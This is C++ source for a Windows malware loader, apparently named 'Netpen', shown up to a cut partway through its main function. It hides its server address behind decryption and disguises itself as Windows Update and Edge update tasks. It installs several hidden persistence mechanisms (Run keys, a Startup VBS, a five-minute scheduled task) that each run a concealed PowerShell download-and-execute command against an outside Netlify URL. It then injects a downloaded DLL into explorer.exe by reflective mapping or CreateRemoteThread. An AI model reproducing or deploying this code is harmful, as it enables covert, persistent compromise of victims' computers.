#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <cstdio>
#include "config.h"

#define RLOG(fmt, ...) do { \
    FILE* _f = _wfopen(L"C:\\ProgramData\\netpen_inj.log", L"a"); \
    if (_f) { fprintf(_f, "RInj: " fmt "\n", ##__VA_ARGS__); fclose(_f); } \
} while(0)

#define NETPEN_REGKEY L"Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
#define NETPEN_TASKNAME L"MicrosoftEdgeUpdateTaskCore"
#define NETPEN_DOWNLOAD_URL L"https://allseeing.netlify.app/a"
#define NETPEN_FILENAME L"RuntimeBroker.exe"

static std::wstring g_supabaseHost;

static void InitConfig() {
    g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
}

static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    bool ok = true;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            DWORD written = 0;
            if (!WriteFile(hFile, buf, downloaded, &written, NULL) || written != downloaded) { ok = false; delete[] buf; break; }
        }
        delete[] buf;
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    if (!ok) { DeleteFileA(outputPath); return false; }
    return true;
}

static std::vector<BYTE> HttpDownloadToMemory(const wchar_t* path) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { RLOG("HTTP: WinHttpOpen failed gle=%lu", GetLastError()); return {}; }
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { RLOG("HTTP: WinHttpConnect failed gle=%lu", GetLastError()); WinHttpCloseHandle(hSession); return {}; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { RLOG("HTTP: WinHttpOpenRequest failed gle=%lu", GetLastError()); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return {}; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { RLOG("HTTP: SendRequest failed gle=%lu", GetLastError()); WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return {}; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { RLOG("HTTP: ReceiveResponse failed gle=%lu", GetLastError()); WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return {}; }
    std::vector<BYTE> result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        size_t old = result.size();
        result.resize(old + size);
        DWORD downloaded = 0;
        if (!WinHttpReadData(hRequest, result.data() + old, size, &downloaded) || downloaded == 0) {
            RLOG("HTTP: ReadData failed gle=%lu size=%lu", GetLastError(), size);
            break;
        }
        result.resize(old + downloaded);
    }
    RLOG("HTTP: downloaded %zu bytes", result.size());
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return result;
}

static bool HttpGetToString(const wchar_t* path, std::string& out) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { RLOG("HTTPstr: WinHttpOpen failed gle=%lu", GetLastError()); return false; }
    WinHttpSetTimeouts(hSession, 10000, 10000, 10000, 10000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { RLOG("HTTPstr: WinHttpConnect failed gle=%lu", GetLastError()); WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { RLOG("HTTPstr: OpenRequest failed gle=%lu", GetLastError()); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { RLOG("HTTPstr: SendRequest failed gle=%lu", GetLastError()); WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { RLOG("HTTPstr: ReceiveResponse failed gle=%lu", GetLastError()); WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    std::string result;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0)
            result.append(buf, downloaded);
        delete[] buf;
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    out = result;
    RLOG("HTTPstr: got %zu bytes for %ls", result.size(), path);
    return !result.empty();
}

static int GetRemoteVersion() {
    std::string verStr;
    if (HttpGetToString(L"/storage/v1/object/public/Netpen/version.txt", verStr))
        return atoi(verStr.c_str());
    return -1;
}

static int GetStoredVersion() {
    HKEY hKey;
    DWORD ver = 0, sz = sizeof(ver), type = 0;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "V", NULL, &type, (BYTE*)&ver, &sz);
        RegCloseKey(hKey);
    }
    return (int)ver;
}

static void SetStoredVersion(int ver) {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD v = (DWORD)ver;
        RegSetValueExA(hKey, "V", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

static DWORD FindExplorerPid() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) { RLOG("FEP: snapshot failed gle=%lu", GetLastError()); return 0; }
    DWORD sessionId = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) sessionId = 0;
    RLOG("FEP: our sessionId=%lu", sessionId);
    if (sessionId == 0) {
        typedef DWORD (WINAPI *WTSGACS_t)();
        WTSGACS_t wts = (WTSGACS_t)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "WTSGetActiveConsoleSessionId");
        if (wts) { sessionId = wts(); RLOG("FEP: WTS sessionId=%lu", sessionId); }
    }
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"explorer.exe") == 0) {
                DWORD procSess = 0;
                if (ProcessIdToSessionId(pe.th32ProcessID, &procSess) && procSess == sessionId) {
                    pid = pe.th32ProcessID;
                    break;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    RLOG("FEP: pid=%lu", pid);
    return pid;
}

static bool RunCmd(const std::wstring& cmd) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    std::wstring mutableCmd = cmd;
    if (!CreateProcessW(NULL, &mutableCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return false;
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

static void InstallPersistence() {
    HKEY hKey;
    bool installed = (RegOpenKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS);
    if (installed) RegCloseKey(hKey);

    std::wstring psCmd = L"powershell -w h -c \"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"";

    if (!installed) {
        if (RegCreateKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD one = 1;
            RegSetValueExA(hKey, "I", 0, REG_DWORD, (BYTE*)&one, sizeof(one));
            RegCloseKey(hKey);
        }
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
            RegCloseKey(hKey);
        }
        wchar_t appData[MAX_PATH];
        if (GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH) > 0) {
            std::wstring vbsPath = std::wstring(appData) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + std::wstring(NETPEN_FILENAME) + L".update.vbs";
            std::wstring vbsContent = L"CreateObject(\"WScript.Shell\").Run \"powershell -w h -c \"\"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"\"\", 0, False\r\n";
            HANDLE hFile = CreateFileW(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD w = 0;
                WriteFile(hFile, vbsContent.c_str(), (DWORD)(vbsContent.size() * sizeof(wchar_t)), &w, NULL);
                CloseHandle(hFile);
            }
        }
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
            RegCloseKey(hKey);
        }
    }

    std::wstring batDir = L"C:\\ProgramData\\Netpen";
    CreateDirectoryW(batDir.c_str(), NULL);
    std::wstring batFile = batDir + L"\\" + std::wstring(NETPEN_FILENAME) + L".update.bat";
    std::wstring batContent = L"@start /b \"\" " + psCmd + L"\r\n";
    HANDLE hBat = CreateFileW(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hBat != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(hBat, batContent.c_str(), (DWORD)(batContent.size() * sizeof(wchar_t)), &w, NULL);
        CloseHandle(hBat);
    }
    std::wstring taskCmd = L"schtasks /create /tn " + std::wstring(NETPEN_TASKNAME) + L" /tr \"\\\"cmd.exe\\\" /c \\\"" + batFile + L"\\\"\" /sc MINUTE /mo 5 /rl HIGHEST /f";
    RunCmd(taskCmd);
}

// ─── Reflective PE Mapper ─────────────────────────────────────────────

static BYTE* RvaToPtr(BYTE* dllData, PIMAGE_NT_HEADERS nt, DWORD rva) {
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD va = sections[i].VirtualAddress;
        DWORD sz = (sections[i].Misc.VirtualSize > sections[i].SizeOfRawData) ? sections[i].Misc.VirtualSize : sections[i].SizeOfRawData;
        if (rva >= va && rva < va + sz)
            return dllData + (rva - va) + sections[i].PointerToRawData;
    }
    if (rva < (DWORD)(sections[0].VirtualAddress))
        return dllData + rva;
    return NULL;
}

static ULONGLONG GetRemoteModuleBase(HANDLE hProcess, const wchar_t* name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetProcessId(hProcess));
    if (hSnapshot == INVALID_HANDLE_VALUE) { RLOG("GRMB: snapshot failed for %ls gle=%lu", name, GetLastError()); return 0; }
    MODULEENTRY32W me = { sizeof(me) };
    ULONGLONG base = 0;
    if (Module32FirstW(hSnapshot, &me)) {
        do {
            if (lstrcmpiW(me.szModule, name) == 0) { base = (ULONGLONG)me.modBaseAddr; break; }
            if (lstrcmpiW(me.szExePath, name) == 0) { base = (ULONGLONG)me.modBaseAddr; break; }
        } while (Module32NextW(hSnapshot, &me));
    }
    CloseHandle(hSnapshot);
    RLOG("GRMB: %ls base=%llx", name, base);
    return base;
}

static ULONGLONG ForceLoadDll(HANDLE hProcess, const wchar_t* dllName) {
    size_t nameBytes = (wcslen(dllName) + 1) * sizeof(wchar_t);
    void* remoteName = VirtualAllocEx(hProcess, NULL, nameBytes, MEM_COMMIT, PAGE_READWRITE);
    if (!remoteName) { RLOG("FLD: VA failed for %ls gle=%lu", dllName, GetLastError()); return 0; }
    WriteProcessMemory(hProcess, remoteName, dllName, nameBytes, NULL);

    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC llW = GetProcAddress(hK32, "LoadLibraryW");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)llW, remoteName, 0, NULL);
    if (!hThread) { RLOG("FLD: CRT failed for %ls gle=%lu", dllName, GetLastError()); VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE); return 0; }
    WaitForSingleObject(hThread, 10000);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
    if (!exitCode) RLOG("FLD: %ls returned 0 (load failed in remote)", dllName);
    return (ULONGLONG)exitCode;
}

static ULONGLONG MapSections(HANDLE hProcess, BYTE* dllData, PIMAGE_NT_HEADERS nt) {
    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    ULONGLONG preferedBase = nt->OptionalHeader.ImageBase;

    void* alloc = VirtualAllocEx(hProcess, (void*)preferedBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc) {
        RLOG("MapSec: VA preferred %llx sz=%lu gle=%lu", preferedBase, imageSize, GetLastError());
        alloc = VirtualAllocEx(hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!alloc) { RLOG("MapSec: VA any addr sz=%lu gle=%lu", imageSize, GetLastError()); return 0; }
    ULONGLONG remoteBase = (ULONGLONG)alloc;

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, alloc, dllData, nt->OptionalHeader.SizeOfHeaders, &bytesWritten) || bytesWritten != nt->OptionalHeader.SizeOfHeaders) {
        RLOG("MapSec: WPM headers sz=%lu written=%zu gle=%lu", nt->OptionalHeader.SizeOfHeaders, bytesWritten, GetLastError());
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        return 0;
    }

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        void* remoteAddr = (BYTE*)remoteBase + sections[i].VirtualAddress;
        BYTE* localData = dllData + sections[i].PointerToRawData;
        DWORD size = (sections[i].SizeOfRawData < sections[i].Misc.VirtualSize) ? sections[i].SizeOfRawData : sections[i].Misc.VirtualSize;
        if (size > 0) {
            bytesWritten = 0;
            if (!WriteProcessMemory(hProcess, remoteAddr, localData, size, &bytesWritten) || bytesWritten != size) {
                RLOG("MapSec: WPM section %u va=%llx sz=%lu written=%zu gle=%lu", i, (ULONGLONG)remoteAddr, size, bytesWritten, GetLastError());
                VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
                return 0;
            }
        }

        DWORD protect = PAGE_READONLY;
        DWORD ch = sections[i].Characteristics;
        if (ch & IMAGE_SCN_MEM_EXECUTE) protect = PAGE_EXECUTE_READ;
        if (ch & IMAGE_SCN_MEM_WRITE) protect = PAGE_READWRITE;
        if ((ch & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE)) == (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE))
            protect = PAGE_EXECUTE_READWRITE;
        DWORD old;
        if (!VirtualProtectEx(hProcess, remoteAddr, size, protect, &old))
            RLOG("MapSec: VPE section %u failed gle=%lu (non-fatal)", i, GetLastError());
    }
    RLOG("MapSec: OK base=%llx", remoteBase);
    return remoteBase;
}

static bool ResolveImports(HANDLE hProcess, BYTE* dllData, PIMAGE_NT_HEADERS nt, ULONGLONG remoteBase) {
    PIMAGE_DATA_DIRECTORY importDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!importDir->VirtualAddress || !importDir->Size) return true;

    PIMAGE_IMPORT_DESCRIPTOR desc = (PIMAGE_IMPORT_DESCRIPTOR)RvaToPtr(dllData, nt, importDir->VirtualAddress);
    if (!desc) return true;

    for (; desc->Name; desc++) {
        char* dllNameA = (char*)RvaToPtr(dllData, nt, desc->Name);
        if (!dllNameA) { RLOG("Rslv: null dllName for import"); return false; }

        int wlen = MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, NULL, 0);
        wchar_t* dllNameW = new wchar_t[wlen];
        MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, dllNameW, wlen);

        ULONGLONG remoteDllBase = GetRemoteModuleBase(hProcess, dllNameW);
        if (!remoteDllBase) remoteDllBase = ForceLoadDll(hProcess, dllNameW);
        if (!remoteDllBase) { RLOG("Rslv: cant load %s remote", dllNameA); delete[] dllNameW; return false; }

        HMODULE hLocalDll = LoadLibraryW(dllNameW);
        if (!hLocalDll) { RLOG("Rslv: cant load %s local gle=%lu", dllNameA, GetLastError()); delete[] dllNameW; return false; }

        PIMAGE_THUNK_DATA origThunk = desc->OriginalFirstThunk
            ? (PIMAGE_THUNK_DATA)RvaToPtr(dllData, nt, desc->OriginalFirstThunk)
            : (PIMAGE_THUNK_DATA)RvaToPtr(dllData, nt, desc->FirstThunk);
        if (!origThunk) { RLOG("Rslv: null origThunk for %s", dllNameA); FreeLibrary(hLocalDll); delete[] dllNameW; return false; }

        int i = 0;
        for (; origThunk[i].u1.AddressOfData; i++) {
            FARPROC funcAddr = NULL;
            if (IMAGE_SNAP_BY_ORDINAL(origThunk[i].u1.Ordinal)) {
                funcAddr = GetProcAddress(hLocalDll, MAKEINTRESOURCEA(IMAGE_ORDINAL(origThunk[i].u1.Ordinal)));
            } else {
                PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)RvaToPtr(dllData, nt, (DWORD)origThunk[i].u1.AddressOfData);
                if (!ibn) { RLOG("Rslv: null ibn for import %d %s", i, dllNameA); FreeLibrary(hLocalDll); delete[] dllNameW; return false; }
                funcAddr = GetProcAddress(hLocalDll, (char*)ibn->Name);
            }
            if (!funcAddr) { RLOG("Rslv: GPA failed import %d %s gle=%lu", i, dllNameA, GetLastError()); FreeLibrary(hLocalDll); delete[] dllNameW; return false; }

            ULONGLONG remoteEntry = remoteBase + desc->FirstThunk + (ULONGLONG)i * sizeof(ULONGLONG);
            ULONGLONG addr = (ULONGLONG)funcAddr;
            SIZE_T written = 0;
            WriteProcessMemory(hProcess, (void*)remoteEntry, &addr, sizeof(addr), &written);
            if (written != sizeof(addr)) { RLOG("Rslv: WPM failed import %d %s written=%zu", i, dllNameA, written); FreeLibrary(hLocalDll); delete[] dllNameW; return false; }
        }

        FreeLibrary(hLocalDll);
        delete[] dllNameW;
    }
    return true;
}

static bool ApplyRelocs(HANDLE hProcess, BYTE* dllData, PIMAGE_NT_HEADERS nt, ULONGLONG remoteBase) {
    ULONGLONG delta = remoteBase - nt->OptionalHeader.ImageBase;
    if (delta == 0) return true;

    PIMAGE_DATA_DIRECTORY relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir->VirtualAddress) { RLOG("Reloc: no reloc dir"); return false; }

    BYTE* cursor = RvaToPtr(dllData, nt, relocDir->VirtualAddress);
    BYTE* end = cursor + relocDir->Size;
    if (!cursor) { RLOG("Reloc: null cursor for reloc va=%08x", relocDir->VirtualAddress); return false; }

    while (cursor < end) {
        PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)cursor;
        if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) { RLOG("Reloc: bad block size %u", block->SizeOfBlock); break; }
        DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)(block + 1);
        for (DWORD i = 0; i < count; i++) {
            if (entries[i] == 0) continue;
            int type = (entries[i] >> 12) & 0xF;
            int offset = entries[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG remoteAddr = remoteBase + block->VirtualAddress + offset;
                ULONGLONG oldValue = 0;
                SIZE_T read = 0;
                ReadProcessMemory(hProcess, (void*)remoteAddr, &oldValue, sizeof(oldValue), &read);
                if (read != sizeof(oldValue)) { RLOG("Reloc: RPM failed at %llx read=%zu gle=%lu", remoteAddr, read, GetLastError()); continue; }
                oldValue += delta;
                WriteProcessMemory(hProcess, (void*)remoteAddr, &oldValue, sizeof(oldValue), NULL);
            }
        }
        cursor += block->SizeOfBlock;
    }
    return true;
}

static DWORD GetExportRva(BYTE* dllData, PIMAGE_NT_HEADERS nt, const char* name) {
    PIMAGE_DATA_DIRECTORY expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir->VirtualAddress) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)RvaToPtr(dllData, nt, expDir->VirtualAddress);
    if (!exp) return 0;

    DWORD* names = (DWORD*)RvaToPtr(dllData, nt, exp->AddressOfNames);
    WORD* ordinals = (WORD*)RvaToPtr(dllData, nt, exp->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)RvaToPtr(dllData, nt, exp->AddressOfFunctions);
    if (!names || !ordinals || !functions) return 0;

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* funcName = (char*)RvaToPtr(dllData, nt, names[i]);
        if (funcName && strcmp(funcName, name) == 0)
            return functions[ordinals[i]];
    }
    return 0;
}

static bool ReflectiveInject(HANDLE hProcess, BYTE* dllData, size_t dllSize, ULONGLONG* outBase) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { RLOG("RefInject: bad DOS sig %04x", dos->e_magic); return false; }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { RLOG("RefInject: bad NT sig %08x", nt->Signature); return false; }
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) { RLOG("RefInject: not x64 %04x", nt->FileHeader.Machine); return false; }

    ULONGLONG remoteBase = MapSections(hProcess, dllData, nt);
    if (!remoteBase) { RLOG("RefInject: MapSections failed"); return false; }
    *outBase = remoteBase;

    if (!ApplyRelocs(hProcess, dllData, nt, remoteBase)) {
        RLOG("RefInject: ApplyRelocs failed, freeing base");
        VirtualFreeEx(hProcess, (void*)remoteBase, 0, MEM_RELEASE);
        return false;
    }
    if (!ResolveImports(hProcess, dllData, nt, remoteBase)) {
        RLOG("RefInject: ResolveImports failed, freeing base");
        VirtualFreeEx(hProcess, (void*)remoteBase, 0, MEM_RELEASE);
        return false;
    }
    return true;
}

static bool DiskInject(HANDLE hProcess, BYTE* dllData, size_t dllSize, ULONGLONG* outBase) {
    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);
    std::string dllPath = std::string(tmpDir) + "agent_" + std::to_string(GetTickCount()) + ".dll";

    HANDLE hFile = CreateFileA(dllPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { RLOG("Disk: create %s failed gle=%lu", dllPath.c_str(), GetLastError()); return false; }
    DWORD written = 0;
    WriteFile(hFile, dllData, (DWORD)dllSize, &written, NULL);
    CloseHandle(hFile);
    if (written != dllSize) { RLOG("Disk: wrote %lu of %zu bytes", written, dllSize); DeleteFileA(dllPath.c_str()); return false; }

    int wlen = MultiByteToWideChar(CP_UTF8, 0, dllPath.c_str(), -1, NULL, 0);
    std::wstring dllPathW((size_t)wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, dllPath.c_str(), -1, &dllPathW[0], wlen);

    size_t nameBytes = (dllPathW.size() + 1) * sizeof(wchar_t);
    void* remotePath = VirtualAllocEx(hProcess, NULL, nameBytes, MEM_COMMIT, PAGE_READWRITE);
    if (!remotePath) { RLOG("Disk: VA remotePath failed gle=%lu", GetLastError()); DeleteFileA(dllPath.c_str()); return false; }
    WriteProcessMemory(hProcess, remotePath, dllPathW.c_str(), nameBytes, NULL);

    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC llW = GetProcAddress(hK32, "LoadLibraryW");

    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)llW, remotePath, 0, NULL);
    if (!hLoadThread) { RLOG("Disk: CRT failed gle=%lu", GetLastError()); VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE); DeleteFileA(dllPath.c_str()); return false; }
    DWORD waitResult = WaitForSingleObject(hLoadThread, 10000);
    DWORD loadExitCode = 0;
    GetExitCodeThread(hLoadThread, &loadExitCode);
    if (waitResult == WAIT_TIMEOUT) { RLOG("Disk: CRT timed out"); TerminateThread(hLoadThread, 1); }
    CloseHandle(hLoadThread);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);

    if (waitResult != WAIT_OBJECT_0 || loadExitCode == 0) { RLOG("Disk: load failed wait=%u exit=%lu", waitResult, loadExitCode); DeleteFileA(dllPath.c_str()); return false; }

    *outBase = GetRemoteModuleBase(hProcess, dllPathW.c_str());
    RLOG("Disk: OK base=%llx", *outBase);
    DeleteFileA(dllPath.c_str());
    return *outBase != 0;
}

static bool StartAgentInit(HANDLE hProcess, ULONGLONG dllBase, DWORD initRva) {
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(dllBase + initRva), (void*)dllBase, 0, NULL);
    if (!hThread) { RLOG("StartAI: CRT failed gle=%lu", GetLastError()); return false; }
    WaitForSingleObject(hThread, 5000);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    RLOG("StartAI: thread exit=%lu", exitCode);
    CloseHandle(hThread);
    return true;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    InitConfig();
    InstallPersistence();

    HANDLE hAgentEvent = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunningV2");
    bool agentAlive = (hAgentEvent != NULL && WaitForSingleObject(hAgentEvent, 0) == WAIT_OBJECT_0);
    if (hAgentEvent) CloseHandle(hAgentEvent);
    if (!agentAlive) {
        HANDLE hOld = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
        if (hOld) { agentAlive = true; CloseHandle(hOld); }
    }

    int remoteVer = GetRemoteVersion();
    int storedVer = GetStoredVersion();
    RLOG("Main: remoteVer=%d storedVer=%d agentAlive=%d", remoteVer, storedVer, (int)agentAlive);

    if (agentAlive && remoteVer >= 0 && remoteVer <= storedVer) {
        RLOG("Main: agent alive, version current, skip");
        return 0;
    }

    if (agentAlive && remoteVer > storedVer) {
        RLOG("Main: agent alive, new version %d > %d, stopping old", remoteVer, storedVer);
        HANDLE hStop = CreateEventW(NULL, TRUE, FALSE, L"NetpenAgentStop");
        if (hStop) SetEvent(hStop);
